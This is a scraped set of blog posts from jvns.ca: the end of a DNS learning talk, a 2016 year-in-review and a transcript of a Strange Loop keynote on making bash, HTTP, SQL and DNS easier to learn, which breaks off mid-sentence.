\n\nOkay. Let's go over the ways we've talked about learning things!\n\n \nFirst, spy on it. I find that when I look at things like\nto see like really what's happening under the hood, and when I look at like,\nwhat's in the bytes, you know what's going on? It's often like not as\ncomplicated as I think. Like, oh, there's just the domain name and the\ntype. It really makes me feel far more confident that I understand that thing.\n \n\n \nI try to notice when I'm confused, and I want to say again, that \nnoticing when you're confused is something that like we don't\nalways have time for right? It's something to do when you have the energy. For\nexample there's this weird DNS query I saw in one of the demos today that I\ndon't understand, but I ignored it because, well, I'm giving a talk. But maybe one day I'll feel like looking at it.\n \n\n \nWe talked about reading the specification, which, there are few times I feel\nlike more powerful than when I'm in like a discussion with someone, and I KNOW that I have the right answer because, well, I read the specification!\nIt's a really nice way to feel certain. \n \n\n \nI love to do experiments to check that my understanding of stuff is right. And\noften I learn that my understanding of something is wrong! I had an example in\nthis talk that I was going to include and I did an experiment to check that\nthat example was true, and it wasn't! And now I know that. I love that\nexperiments on computers are very fast and cheap and usually have no\nconsequences.\n \n\n \nAnd then the last thing we talked about and truly my favorite, but the most\nwork is like implementing your own terrible version. For me,\nthe confidence I get from writing like a terrible DNS implementation that works\non 11 different domain names is unmatched. If my thing works at all, I feel like,\nwow, you can't tell me that I don't know how DNS works! I implemented it! And\nit doesn't matter if my implementation is \"bad\" because I know that it works!\nI've tested it. I've seen it with my own eyes. And I think that just feels\namazing. And there are also no consequences because you're never going to run\nit in production. So it doesn't matter if it's terrible. It just exists to give\nyou huge amounts of confidence in yourself. And I think that's really nice.\n \n \n \n\n \n \n \n \n \nThat's all for me. Thank you for listening.\n \n \n\n thanks to the organizers! \n\n Thanks to the RubyConf Mini organizers for doing such a great job with the\nconference – it was the first conference I’d been to since 2019, and I had a\ngreat time. \n\n a quick plug for “How DNS Works” \n\n If you liked this talk and want to to spend  less  than 10 years learning about\nhow DNS works, I spent 6 months condensing everything I know about DNS into 28\npages. It’s here and you can get it for $12:  How DNS Works . \n\n"},
{"url": "https://jvns.ca/blog/2016/12/21/2016--year-in-review/", "title": "2016: Year in review", "content": "\n     \n\n I’m mostly writing this for me, but maybe it will be interesting to you\ntoo! Here’s are some things that happened in 2016. (just to me\npersonally, mostly about programming) \n\n a new zine! \n\n I wrote another zine in 2016! Here’s the cover. (or you can click it to\nread it) \n\n   \n\n I’m really happy with how this one turned out. I also made a dedicated\npage at  jvns.ca/zines  where you can\nread all of the zines. \n\n I’m working on another zine right now about computer networking which\nshould be out in January or so. \n\n (also I ran an  indiegogo\ncampaign \nto help me print zines!! people were really really helpful and it raised\nenough money to print SO MUCH STUFF. it was very heartwarming.) \n\n comics! \n\n I drew a comic about programming every day in November. This turned out\nAWESOME. Way better than I thought they would. You can\nread them all at  drawings.jvns.ca \n\n It’s been really interesting to see how many people LOVE learning basic\nstuff about operating systems (assembly! threads! the stack! floating\npoint!). Often the things I go over that I think are relatively basic\nare the ones where people respond “wow, I had no idea how that worked,\nthat’s really cool!” (and they’re right! It IS really cool!) \n\n It’s somewhat shocking to me that some people now refer to me as an\n“artist” given my sorta nonexistant drawing skills, but, hey, whatever\nworks :). It’s been a really good way to communicate ideas. \n\n talks! \n\n I \n\n \n spoke at PyData Berlin \nabout some reasons to be skeptical about / excited about\nmachine learning (also, I went to Berlin for 6 weeks! That was fun!) \n keynoted RustConf \n talked at Strange Loop about linux debugging tools  (and gave the same talk at PolyConf) \n did a lightning talk at !!Con about how to trick neural networks \n spoke at CUSEC about how understanding operating systems fundamentals\nis important \n \n\n Doing the RustConf keynote was kind of exciting/scary (me??? keynote???) and I think it\nturned out well and I’m happy I did it. I love the Rust community and I’m happy with the talk I gave. \n\n Transcribing my talks was a cool idea and I’d like to keep doing that. \n\n It’s looking like 2017 will be the year of Julia going to a few\noperations / SRE conferences, so watch out for that. I like going to new\nconferences instead of going to the same ones all the time. I want to\ntry to keep the number of conferences I travel for down. \n\n cool: writing about work \n\n This year I wrote my first work blog post (on  service discovery at Stripe . This is a kind of weird thing\nto celebrate (I’ve written way way more on this blog), but it made me\nsurprisingly happy to be able to write in public about some of the stuff we\nwork on / think about. I guess I like being able to write a little bit at work. I also\nworked on a  job description  for my job. \n\n I’ve been thinking a little about Kelsey Hightower’s advice to  not let your job title limit your impact . \n\n I like that I have some flexibility in my job to do things like write\nblog posts / try to make our job descriptions better / organize  events featuring some of my favorite speakers .\nMy manager is excited about me doing that stuff which makes me happy. \n\n also cool: switching to infrastructure \n\n Last year I wrote: \n\n \n Apparently I like writing about how things work, and how to make\ncomputers go fast. I did some fun performance optimization at work.\nMaybe I will do more of that next year! \n \n\n I did a little more performance optimization work in 2016, and I was\nmaybe hoping to do even more, but that did not seem to be what the\ncompany needed. That’s okay! I did get to learn how A LOT OF THINGS WORK\nTHOUGH. I switched to the team that’s responsible for networking\n+ code deployment + running programs (“like heroku, but harder to use”) and it’s\nreally fun partly because it’s now my job to understand a lot of the\nnitty-gritty details about how all of our infrastructure works. And I\nget to work with a lot of fantastic people who know a lot of things\nabout operating systems and networking and operations. There have been a\nlot of interesting “infrastructure as a product” conversations. \n\n And then now that I understand how a lot of it works, I can help make the\ninternal “product” we provide better! So that’s what I’ve been working\non. I like my new team a lot. \n\n seeing a thing I worked on ship \n\n Last year at this time I was excited about interpretable machine\nlearning algorithms (how do you know  why  the machine learning model\ndecided to do that thing?) because I think it’s important for users of\nthose models. This year stripe released a fraud detection tool called  Radar  that (as well as lot of\nother things) gives you a\nreason for why the ML model made the decision it did (you can see examples at  the docs here )! \n\n About a bajillion awesome people worked on this (and in particular\nothers did most of the work on the interpretability stuff), and I worked on the\nmachine learning system behind it for a while so it’s awesome to see it\nout there. \n\n blogging \n\n I wrote 87 blog posts this year, and I think about 70,000 words. So! \n\n a few I liked: \n\n \n I liked writing  this discussion of how rkt runs containers  because I think it’s important to be able to walk through what a complex piece of software is doing when you run it (if not necessarily rkt specifically) \n a critique of the CAP theorem  because I would maybe eventually like to understand more about distributed systems \n learning to like design documents  has been kind of a theme this year – I’m trying to get better at designing and iterating on systems \n I learned  how a CDN works ,  why UDP packets get dropped , and a lot more about networking \n this  collection of drawings about Linux \n this  post about how stock options work  helped me understand how stock options work, which was useful (technically from the dying days of 2015) \n how much memory is my process using?  was a long standing mystery in my head and I finally understand (I think) all the basic facts about virtual memory on Linux. Victory. \n \n\n conclusions? \n\n some things that worked: \n\n \n drawing comics (this was a surprise) \n asking a lot of questions about how computers work (not a surprise) \n working on a team of people who know more stuff than me, and listening\nto what they have to say \n asking for advice from people who are more experienced than me. \n at work, figuring out what’s important to do and then doing the work\nto get it done, especially if that work is boring / tedious \n working on one thing at a time (or at least not too many things) \n doing the things I’m excited about in my spare time (writing about\nprogramming) at work a tiiiiny bit more \n getting a bit better at software “process” things like design\ndocuments \n \n\n"},
{"url": "https://jvns.ca/blog/2023/10/06/new-talk--making-hard-things-easy/", "title": "New talk: Making Hard Things Easy", "content": "\n     \n\n A few weeks ago I gave a keynote at  Strange Loop \ncalled Making Hard Things Easy. It’s about why I think some things are hard\nto learn and ideas for how we can make them easier. \n\n Here’s the video, as well as the slides and a transcript of (roughly) what I\nsaid in the talk. \n\n the video \n\n \n\n the transcript \n\n \n.container{\n  display:flex;\n}\n.slide {\n  width:40%;\n  border-bottom: 2px #ccc dashed;\n  padding: 10px 0px;\n}\n\n.slide img {\n  width: 100%;\n}\n.content{\n  width:60%;\n  align-items:center;\n  padding:20px;\n}\n@media (max-width: 400px) \n{\n  .container{\n    display:block;\n  }\n  .slide, .content {\n    width:100%;\n  }\n}\n \n\n \n \n \n \n \n\n\nHello, Strange Loop! Strange Loop is one of the first places I\nspoke almost 10 years ago and I'm so honored to be back here today for the\nlast one. Can we have one more round of applause for the organizers?\n\n\n \n \n\n \n \n \n \n \n\n \nI often give talks about things that I'm excited about,\nor that I think are really fun.\n \n\n \nBut today, I want to talk about something that I'm a little bit mad about,\nwhich is that sometimes things that seem like they should be basic take me 10\nyears or 20 years to learn, way longer than it seems like they should. \n \n\n \n \n\n \n \n \n \n \n\nOne thing that took me a long time to learn was DNS, which is this question\nof -- what's the IP address for a domain name like example.com?\nThis feels like it should be a straightforward thing.\n\n\n \n \n\n \n \n \n \n \n\nBut seven years into learning DNS, I'd be setting up a website. And I'd feel\nlike things should be working. I thought I understood DNS. But then I'd run\ninto problems, like my domain name wouldn't work. And I'd wonder -- why not?\nWhat's happening?\n\n \n \n\n \n \n \n \n \n\n \nAnd sometimes this would feel kind of personal! This shouldn't be so hard\nfor me! I should understand this already. It's been seven years!\n \n\n\n \nAnd this \"it's just me\" attitude is often encouraged -- when I write about\nfinding things hard to learn on the Internet, Internet strangers will sometimes\ntell me: \"yeah, this is easy! You should get it already! Maybe you're just not\nvery smart!\"\n \n\n \nBut luckily I have a pretty big ego so I don't take the internet strangers too\nseriously. And I have a lot of patience so I'm willing to keep coming back to a\ntopic I'm confused about. There were maybe four different things that were\ngoing wrong with DNS in my life and eventually I figured them all out.\n \n\n\n \n \n\n \n \n \n \n \n\n \nSo, hooray! I understood DNS! I win! But then I see some of my friends struggling with\nthe exact same things.\n \n\n \nThey're wondering, hey, my DNS isn't working. Why not? \n \n\n\n\n\n \n \n\n \n \n \n \n \n \nAnd it doesn't end. We're still having the same problems over and over and over\nagain. And it's frustrating! It feels redundant! It makes\nme mad. Especially when friends take it personally, and they feel like \"hey I\nshould really understand this already\".\n \n\n \nBecause everyone is going through this. From the sounds of recognition I hear,\nI think a lot of you have been through some of these same problems with DNS.\n \n \n \n\n \n \n \n \n \n\nI got so mad about this that I decided to make it my job. \n \n \n\n \n \n \n \n \n\n    \n   I started a little publishing company called Wizard Zines where --\n    \n   \n  \n (applause)\n  \n \n    \n   Wow. Where I write about some of these topics and try to demystify them.\n    \n     \n \n \n\n \n \n \n \n \n     Here are a few of the zines I've published. I want to talk today about a\n     few of these topics and what makes them so hard and how we can make them\n     easier.\n     \n    \n \n \n\n \n \n \n \n \n\n \n We're going to talk about bash, HTTP, SQL, and DNS.\n  \n    \n\n\n \n \n\n \n \n \n \n \n\n\n \n For each of them, we're\n going to talk a little bit about:\n  \n   \n  \n a.  what's so hard about it? \n  \n   \n  \n b. what are some things we can do to make it a little bit easier for each other?\n  \n\n\n \n \n\n \n \n \n \n \n   Let's start with Bash. \n\n \n \n\n \n \n \n \n \nWhat's so hard about it?\n \n \n\n \n \n \n \n \nSo, bash is a programming language, right?\nBut it's one of the weirdest programming languages that I work\nwith.\n\n\n \n \n\n \n \n \n \n \n\nTo understand why it's weird, let's do a little small demo\nof bash.\n \n \n\n \n \n \n \n \n\n\n \nFirst, let's run this script,  bad.sh :\n \n\n \nmv ./*.txt /tmmpp\necho \"success!\"\n \n\n    \n   This moves a file and prints \"success!\". And with most of the programming languages that I use, if there's a problem, the program will stop.\n    \n   \n  \n [laughter from audience]\n  \n \n  \n \n     But I think a lot of you know from maybe sad experience that bash does not\n     stop, right? It keeps going. And going... and sometimes very bad things\n     happen to your computer in the process. \n    \n   \n  \n When I run this program, here's the output:\n  \n   \n    \nmv: cannot stat './*.txt': No such file or directory\nsuccess!\n \n\n \nIt didn't stop after the failed  mv .\n \n     \n \n \n\n \n \n \n \n \n\n \nEventually I learned that you can write  set\n-e  at the top of your program, and that will make bash stop if\nthere's a problem. \n \n\n \nWhen we run this new program with  set -e  at the top, here's the output:\n \n\n \nmv: cannot stat './*.txt': No such file or directory\n \n\n\n \n \n\n \n \n \n \n \nGreat. We're happy. Everything is good. But every time I think I've learned\neverything that go wrong with bash, I'll find out -- surprise! There are more\nbad things that can happen! Let's look at another program as an example.\n     \n     \n \n\n \n \n \n \n \n\n \nHere we've put our code in a function. And if the function\nfails, we want to echo \"failed\". \n\n \n\n \nSo use  set -e  at the beginning, and you might think everything should be okay. \n \n\n \nBut if we run it... this is the output we get\n \n\n \nmv: cannot stat './*.txt': No such file or directory\nsuccess\n \n\n \nWe get the \"success\" message again! It didn't stop, it just kept going. This is\nbecause the \"or\" ( || echo \"failed\" ) globally disables  set -e  in the\nfunction.\n \n\n \nWhich is certainly not what I wanted, and not what I would expect. But this is\nnot a bug in bash, it's is the documented behavior.\n \n\n \n \n\n \n \n \n \n \n\n \nAnd I think one reason this is tricky is a lot of us don't use bash very often.\nMaybe you write a bash script every six months and don't look at it again.\n \n\n \nWhen you use a system very infrequently and it's full of a lot of weird trivia\nand gotchas, it's hard to use the system correctly.\n \n\n\n \n \n\n \n \n \n \n \n\nSo how can we make this easier? What can we do about it?\n \n \n\n \n \n \n \n \nOne thing that I sometimes hear is -- a newcomer will say \"this is hard\",\nand someone more experienced will say \"Oh, yeah, it's impossible to use bash.\nNobody knows how to use it.\"\n\n\n\n \n \n\n \n \n \n \n \n\n \nBut I would say this is factually untrue. How many of you are using bash?\n \n\n \nA lot of us ARE using it! And it doesn't always work perfectly, but often\nit gets the job done.\n \n\n\n \n \n\n \n \n \n \n \n\nWe have a lot of bash programs that are mostly working, and there's a big\ncommunity of us who are using bash mostly successfully despite all the\nproblems.\n\n \n \n\n \n \n \n \n \n\n \nThe way I think this is --  you have some people on the left in this\ndiagram who are confused about bash, who think it seems awful and\nincomprehensible.\n \n\n \nAnd some people on the right who know how to make the bash work for them,\nmostly.\n \n\n \nSo how do we move people from the left to the right, from being overwhelmed by\na pile of impossible gotchas to being able to mostly use the system correctly?\n \n\n \n \n\n \n \n \n \n \n\nWell, bash has a giant pile of trivia to remember. But who's good at remembering\ngiant piles of trivia?\n \n \n\n \n \n \n \n \n\nNot me! I can't memorize all of the weird things about bash. But computers!\nComputers are great at memorizing trivia!\n\n \n \n\n \n \n \n \n \n\n \nAnd for bash, we have this incredible tool called\nshellcheck.\n \n\n \n[ Applause ]\n \n\n \nYes! Shellcheck is amazing! And shellcheck knows a lot of things that can go\nwrong and can tell you \"oh no, you don't want to do that. You're going to have\na bad time.\"\n \n\n \nI'm very grateful for shellcheck, it makes it much easier for me to write\ntiny bash scripts from time to time. \n \n\n \n \n\n \n \n \n \n \n\n \nNow let's do a shellcheck demo! \n \n\n \n$ shellcheck -o all bad-again.sh\nIn bad-again.sh line 7:\nf || echo \"failed!\"\n^-- SC2310 (info): This function is invoked in an || condition so set -e will be disabled. Invoke separately if failures should cause the script to exit.\n \n\n \nShellcheck gives us this\nlovely error message. The message isn't completely obvious on its own (and this\ncheck is only run if you invoke shellcheck with  -o all ). But\nshellcheck tells you \"hey, there's this problem, maybe you should be worried\nabout that\".\n \n\n \nAnd I think it's wonderful that all these tips live in this linter. \n \n\n\n \n \n\n \n \n \n \n \n\n \nI'm not trying to tell you to write linters, though I think that some of you\nprobably will write linters because this is that kind of crowd.\n \n\n \nI've personally never written a linter, and I'm definitely not going to create\nsomething as cool as shellcheck!\n \n\n \n \n\n \n \n \n \n \n\n \nBut instead, the way I write linters is I tell people about shellcheck from\ntime to time and then I feel a little like I invented shellcheck for those\npeople. Because some people didn't know about the tool until I told them about\nit!\n \n\n \nI didn't find out about shellcheck for a long time and I was kind of mad about\nit when I found out. I felt like -- excuse me? I could have been using\nshellcheck this whole time? I didn't need to remember all of this stuff in\nmy brain?\n \n\n \nSo I think an incredible thing we can do is to reflect on the tools that we're\nusing to reduce our cognitive load and all the things that we can't fit into\nour minds, and make sure our friends or coworkers know about them.\n \n\n \n \n\n \n \n \n \n \n\n \nI also like to warn people about gotchas and some of the terrible things\ncomputers have done to me.\n \n\n \n \n\n \n \n \n \n \n\n \nI think this is an incredibly valuable community service. The example I shared\nabout how  set -e  got disabled is something I learned from my\nfriend Jesse a few weeks ago. \n \n\n \nThey told me how this thing happened to them, and now I know and I don't have\nto go through it personally.\n \n\n \n \n\n \n \n \n \n \n\n \nOne way I see people kind of trying to share terrible things that their\ncomputers have done to them is by sharing \"best practices\".\n \n\n \nBut I really love to hear the stories behind the best practices!\n \n\n\n \n \n\n \n \n \n \n \n\n\n \nIf someone has\na strong opinion like \"nobody should ever use bash\", I want to hear about the\nstory! What did bash do to you? I need to know.\n \n\n \nThe reason I prefer stories to best practices is if I know the story about how\nthe bash hurt you, I can take that information and decide for myself how I want\nto proceed.\n \n\n \nMaybe I feel like -- the computer did that to you? That's okay, I can deal with\nthat problem, I don't mind.\n \n\n \nOr I might instead feel like \"oh no, I'm going to do the best practice you\nrecommended, because I do not want that thing to happen to me\". \n \n\n \nThese bash stories are a great example of that: my reaction to them is \"okay,\nI'm going to keep using bash, I'll just use shellcheck and keep my bash scripts\npretty simple\". But other people see them and decide \"wow, I never want to use\nbash for anything, that's awful, I hate it\".\n \n\n \nDifferent people have different reactions to the same stories and that's okay.\n \n\n \n \n\n \n \n \n \n \nThat's all for bash. Next up we're gonna talk about HTTP. \n \n \n\n \n \n \n \n \n \n \n\n \n \n \n \n \n\n \nI was talking to Marco Rogers at some point, many years ago, and he mentioned\nsome new developers he was working with were struggling with HTTP.\n \n\n \nAnd at first, I was a little confused about this -- I didn't understand what\nwas hard about HTTP.\n \n\n \n \n\n \n \n \n \n \n\n \nThe way I was thinking about it\nat the time was that if you have an HTTP response, it has a few parts: a response\ncode, some headers, and a body.\n \n\n\n \nI felt like -- that's a pretty simple structure, what's the problem? But of\ncourse there was a problem, I just couldn't see what it was at first.\n \n\n\n \n \n\n \n \n \n \n \n\n \nSo, I talked to a friend who was newer to HTTP. And they asked \"why does it\nmatter what headers you set?\"\n \n\n \nAnd I said: \"well, the browser...\"\n \n\n\n \n \n\n \n \n \n \n \nBut then I thought... the browser?\n \n \n\n \n \n \n \n \nthe browser?\n \n \n\n \n \n \n \n \n\n \nThe browser!\n \n\n \nFirefox is 20 million lines of code! It's been\nevolving since the '90s. There have been as I understand it, 1 million\nchanges to the browser security model as people have discovered new and\nexciting exploits and the web has become a scarier and scarier place.\n \n\n \nThe browser is really a lot to understand.\n \n\n \n \n\n \n \n \n \n \n\n\n\n \nOne trick for understanding why a topic is hard is -- if the implementation if the\nthing involves 20 million lines of code, maybe that's why people are confused!\n \n\n \nThough that 20 million lines of code also involves CSS and JS and many other\nthings that aren't HTTP, but still.\n \n\n \n \n\n \n \n \n \n \n\n \nOnce I thought of it in terms of how complex a modern web browser is, it\nmade so much more sense! Of course newcomers are confused about HTTP if you\nhave to understand what the browser is doing!\n \n\n \nThen my problem changed from \"why is this hard?\" to \"how do I explain this at all?\"\n \n\n \nSo how do we make it easier? How do we wrap our minds around this 20 million lines\nof code?\n \n\n\n\n \n \n\n \n \n \n \n \n\n\n \nOne way I think about this for HTTP is: here are some of the HTTP request\nheaders. That's kind of a big list there are 43 headers there.\n \n\n \n \n\n \n \n \n \n \n\n\n \nThere are more unofficial headers too.\n \n\n \n \n\n \n \n \n \n \n\n \nMy brain does not contain all of those headers, I have no idea what most of\nthem are.\n \n\n \nWhen I think about trying to explain big topics, I think about -- what is\nactually in my brain, which only contains a normal human number of things?\n \n\n \n \n\n \n \n \n \n \n\n\n \nThis is  a comic I drew about HTTP request headers .\nYou don't have to read the whole thing. This has 15\nrequest headers.\n \n\n \nI wrote that these are \"the most important headers\", but what I mean by \"most\nimportant\" here is that these are the ones that I know about and use. It's a\nsubjective list.\n \n\n \nI wrote about 12 words about each one, which I think is approximately the\namount of information about each header that lives in my mind.\n \n\n \nFor example I know that you can set  Accept-Encoding  to  gzip \nand then you might get back a compressed response. That's all I know,\nand that's usually all I need to know!\n \n\n \nThis very small set of information is working pretty well for me.\n \n\n \n \n\n \n \n \n \n \n\n\n \nThe general way I think about this trick is \"turn a big list into a small list\".\n \n\n \nTurn the set of EVERY SINGLE THING into just the things I've personally used. I\nfind it helps a lot.\n \n\n \n \n\n \n \n \n \n \n\n\n \nAnother example of this \"turn a big list into a small list\" trick is command line arguments.\n \n\n \nI use a lot of command line tools, the number of arguments they have can be\noverwhelming, and I've written about them  a fair amount  over\nthe years.\n \n\n \n \n\n \n \n \n \n \n\n\n \nHere are all the flags for grep, from its man page. That's too much! I've been\nusing grep for 20 years but I don't know what all that stuff is.\n \n\n \n \n\n \n \n \n \n \n\n \nBut when I look at the grep man page, this is what I see.\n \n\n\n \nI think it's very helpful to newcomers when a more experienced person says\n\"look, I've been using this system for a while, I know about 7 things about it,\nand here's what they are\".\n \n\n \nWe're just pruning those lists down to a more human scale. And it can even help\nother more experienced people -- often someone else will know a slightly\ndifferent set of 7 things from me.\n \n\n \n \n\n \n \n \n \n \n\n \nBut what about the stuff that doesn't fit in my brain?\n \n\n \nBecause I have a few things about HTTP stored in my brain. But sometimes I need\nother information which is hard to remember, like maybe the exact details of\nhow CORS works.\n \n\n \n \n\n \n \n \n \n \n\nAnd so, that's where we come to references. Where do we find the information\nthat we can't remember?\n\n \n \n\n \n \n \n \n \n\n \nI often have trouble finding the right references.\n \n\n \nFor example I've been trying to learn CSS off and on for 20 years. I've made a\nlot of progress -- it's going well!\n \n\n \nBut only in the last 2 years or so I learned about this wonderful website called \n CSS Tricks .\n \n\n \nAnd I felt kind of mad when I learned about CSS Tricks! Why didn't I know about\nthis before? It would have helped me!\n \n\n \n \n\n \n \n \n \n \n\n\n \nBut anyway, I'm happy to know about CSS Tricks now. (though sadly they seem to\nhave stopped publishing in April after the acquisition, I'm still happy the older posts are there)\n \n\n \nFor HTTP, I think a lot of us use the Mozilla Developer Network. \n \n\n\n \n \n\n \n \n \n \n \n\n\n \nAnother HTTP reference I love is the official RFC,  RFC 9110  (also\n 9111 ,\n 9112 ,\n 9113 ,\n 9114 )\n \n\n \nIt's a new authoritative reference for HTTP and it was written just last\nyear, in 2022! They decided to organize all the information really nicely. So if you\nwant to know exactly what the  Connection  header does, you can look\nit up. \n \n\n \nThis is not really my top reference. I'm usually on MDN. But I really\nappreciate that it's available.\n \n\n \n \n\n \n \n \n \n \n\n\n \nSo I love to share my favorite references.\n \n\n \n \n\n \n \n \n \n \n\n \nI do sometimes find it tempting to kind of lie about references. Not on\npurpose.\nBut I'll see something on the internet, and I'll think it's kind of cool, and\ntell a friend about. But then my friend might ask me -- \"when have you used this?\"\nAnd I'll have to admit \"oh, never, I just thought it seemed cool\".\n \n\n \nI think it's important to be honest about what the references that I'm actually\nusing in real life are. Even if maybe the real references I use are a little\n\"embarrassing\", like maybe w3schools or something.\n \n\n\n \n \n\n \n \n \n \n \n\nSo that's HTTP! Next we're going to talk about SQL.\n \n \n\n \n \n \n \n \nThe case of the mysterious execution order.\n \n \n\n \n \n \n \n \n\n \nI started thinking about SQL because someone mentioned they're trying to learn\nSQL. I get most of my zine ideas that way, one person will make an offhand\ncomment and I'll decide \"ok, I'm going to spend 4 months writing about\nthat\". It's a weird process.\n \n\n \nSo I was wondering -- what's hard about SQL? What gets in the way of trying\nto learn that?\n \n\n \nI want to say that when I'm confused about what's hard about something, that's\na fact about me. It's not usually that the thing is easy, it's that I need to\nwork on understanding what's hard about it. It's easy to forget when you've\nbeen using something for a while.\n \n\n \n \n\n \n \n \n \n \n\n \nSo, I was used to reading SQL queries. For example this made up query that tries to\nfind people who own exactly two cats. It felt straightforward\nto me, SELECT,\nFROM, WHERE, GROUP BY.\n \n\n \n \n\n \n \n \n \n \n\n \nBut then I was talking to a friend about these queries who was new to SQL. And\nmy friend asked -- what is this doing?\n \n\n \nI thought, hmm, fair point.\n \n\n\n\n \n \n\n \n \n \n \n \n\n \nAnd I think the point my friend was making was that the order that this SQL\nquery is written in, is not the order that it actually happens in. It happens\nin a different order, and it's not immediately obvious what that is.\n \n\n\n \n \n\n \n \n \n \n \n\nSo how do we make this easier?\n \n \n\n \n \n \n \n \n\n\n \nI like to think about: what does the computer do first?\nWhat actually happens first chronologically?\n \n\n \nComputers actually do live in the same timeline as us. Things happen. Things\nhappen in an order. So what happens first?\n \n\n \n \n\n \n \n \n \n \n\n \n \n\n \n \n \n \n \n\nThe way I think about an SQL query is: is you start with a table like\n cats .\n\n \n \n\n \n \n \n \n \n\nThen maybe you filter it, you remove some stuff. \n \n \n\n \n \n \n \n \n\nThen you make some groups.\n \n \n\n \n \n \n \n \n\nThen you filter the groups, remove some of them.\n \n \n\n \n \n \n \n \n\nThen you do some\naggregation. There's two things in each group.\n \n \n\n \n \n \n \n \n\nAnd you sort it.\n\nAnd you\ncan also limit the results.\n \n \n\n \n \n \n \n \n\n\n \nSo, that's how I think about SQL. The way a query runs is first\nFROM, then WHERE, GROUP BY, HAVING, SELECT, ORDER BY, LIMIT.\n \n\n \nAt least conceptually. Real life databases have optimizations and it's more\ncomplicated than that. But this is the mental model that I use most of the time\nand it works for me. Everything is in the same order as you write it,\nexcept SELECT is fifth. \n \n\n \n \n\n \n \n \n \n \n\nI've really gotten a lot out of this trick where you try to tell the\nchronological story of what the computer is doing. I want to talk about a\ncouple other examples.\n \n \n\n \n \n \n \n \n\n\n \nOne is CORS, in HTTP. \n \n\n \nThis  comic  is way too small to read on the slide.\nBut the idea is if you're making a cross-origin request in your\nbrowser, you can write down every communication that's happening between your\nbrowser and the server, in chronological order.\n \n\n \nAnd I think writing down everything in chronological order makes it a lot easier to understand and more concrete.\n \n\n \n \n\n \n \n \n \n \n\n\n \n\"What happens in chronological order?\" is a very\nstraightforward structure, which is what I like about it. \"What happens first?\"\nfeels like it should be easy to answer. But it's not!\n \n\n \nI've found that it's actually very hard to know what our computers is\ndoing, and it's a really fun question to explore.\n \n\n \n \n\n \n \n \n \n \n\n\n \nAs an example of how this is hard: I wrote a blog post recently called \n \"Behind Hello World on Linux\" . It's about what happens when you run \"hello world\" on a\nLinux computer. I wrote a bunch about it, and I was really happy with it.\n \n\n \nBut after I wrote the post, I thought -- haven't I written about this before? Maybe 10 years ago?\n \n\n \n \n\n \n \n \n \n \n\n \nAnd sure enough, I'd tried to write  \na similar post  10 years before.\n \n\n \nI think this is really cool. Because the 2013 version of this post was about 6\ntimes shorter. This isn't because Linux is more complicated than it was 10\nyears ago -- I think everything in the 2023 post was probably also true in\n2013. The 2013 post just has a lot less information in it.\n \n\n \nThe reason the 2023 post is longer is that I didn't know what was happening\nchronologically on my computer in 2013 very well, and in 2023 I know a lot\nmore. Maybe in 2033 I'll know even more!\n \n\n \nI think a lot of us -- like me in 2013 and honestly me now, often don't know\nthe facts of what's happening on our computers. It's very hard, which is what\nmakes it such a fun question to try and discuss.\n \n\n \n \n\n \n \n \n \n \n\n\n\n \nI think it's cool that all of us\nhave different knowledge about what is happening chronologically on our\ncomputers and we can all chip in to this conversation.\n \n\n \nFor example when I posted this blog post about Hello World on Linux, some people\nmentioned that they had a lot of thoughts about what happens exactly in your\nterminal, or more details about the filesystem, or about what's happening\ninternally in the Python interpreter, or any number of things. You can go\nreally deep.\n \n\n \nI think it's just a really fun collaborative question. \n \n\n \n \n\n \n \n \n \n \n\n \nI've seen \"what happens chronologically?\" work really well as an activity with\ncoworkers, where you're ask: \"when a request comes into this API endpoint we\nrun, how does that work? What happens?\"\n \n\n \nWhat I've seen is that someone will understand some part of the system, like \"X\nhappens, then Y happens, then it goes over to the database and I have no idea\nhow that works\".  And then someone else can chime in and say \"ah, yes, with the\ndatabase A B C happens, but then there's a queue and I don't know about that\".\n \n\n \nI think it's really fun to get together with people who have different\nspecializations and try to make these little timelines of what the\ncomputers are doing. I've learned a lot from doing that with people.\n \n\n\n \n \n\n \n \n \n \n \nThat's all for SQL.\n \n \n\n \n \n \n \n \n\nSo, now we've arrived at DNS which is\nwhere we started the talk.\n \n \n\n \n \n \n \n \n\n\n\n \nEven though I struggled with DNS. Once I got figured it out, I felt like \"dude,\nthis is easy!\". Even though it just took me 10 years to learn how it\nworks.\n \n\n \nBut of course, DNS was pretty hard for me to learn. So -- why is that? Why did\nit take me so long?\n \n\n \n \n\n \n \n \n \n \n\n\n \nSo, I have a little  chart  here of how I think about DNS.\n \n\n \nYou have your browser on the left. And over on the right there's the authoritative\nnameservers, the source of truth of where the DNS records for a domain live. \n \n\n \nIn the middle, there's a function that you call and a cache.\nSo you have browser, function, cache, source of truth.\n \n\n \n \n\n \n \n \n \n \n\n \nOne problem is that there are a lot of things in this diagram that are\ntotally hidden from you.\n \n\n \nThe library code that you're using where you make a DNS request -- there are a\nlot of different libraries you could be using, and it's not straightforward to figure out which one is being used.\nThat was the source of some of my confusion.\n \n\n \nThere's a cache which has a bunch of cached data. That's invisible to you, you\ncan't inspect it easily and you have no control over it. that\n \n\n \nAnd there's a conversation between the cache and the source of\ntruth, these two red arrows which also you can't see at all.\n \n\n \nSo this is kind of tough! How are you supposed to develop an intuition for a\nsystem when it's mostly things that are completely hidden from you? Feels like\na lot to expect.\n \n\n \n \n\n \n \n \n \n \n\nSo, what do we do about this?\n \n \n\n \n \n \n \n \n\n\n \nSo: let's talk about these red arrows\non the right.\n \n\n \nWe have our cache and then we have the source of truth. This conversation\nis normally hidden from you because you often don't control either of these\nservers. Usually they're too busy doing high-performance computing to report to\nyou what they're doing.\n \n\n \nBut I thought: anyone can write an authoritative nameserver!\nIn particular, I could write one that reports back every single message that it receives to its users.\nSo, with my friend  Marie , we wrote a little DNS server.\n \n\n \n \n\n \n \n \n \n \n\n \n(demo of  messwithdns.net )\n \n\n \nThis is called Mess With DNS. The idea is I have a domain name and you\ncan do whatever you want with it. We're going to make a DNS record called\n strangeloop , and we're going to make a CNAME record pointing at\n orange.jvns.ca , which is just a picture of an orange. Because I\nlike oranges.\n \n\n \nAnd then over here, every time a request comes in from a resolver, this will --\nthis will report back what happened. So, if we click on this link, we can see\n-- a Canadian DNS resolver, which is apparently what my browser is configured\nto use, is requesting an IPv4 record and an IPv6 record, A and AAAA.\n \n\n\n(at this point in the demo everyone in the audience starts visiting the link\nand it gets a bit chaotic, it's very funny)\n\n \n \n\n \n \n \n \n \n\n\n \nSo the trick here is to find ways to show people parts of what the computer is\ndoing that are normally hidden.\n \n\n \n \n\n \n \n \n \n \n\n \nAnother great example of showing things that are hidden is this website called  float.exposed \nby  Bartosz Ciechanowski  who makes a lot of incredible visualizations.\n 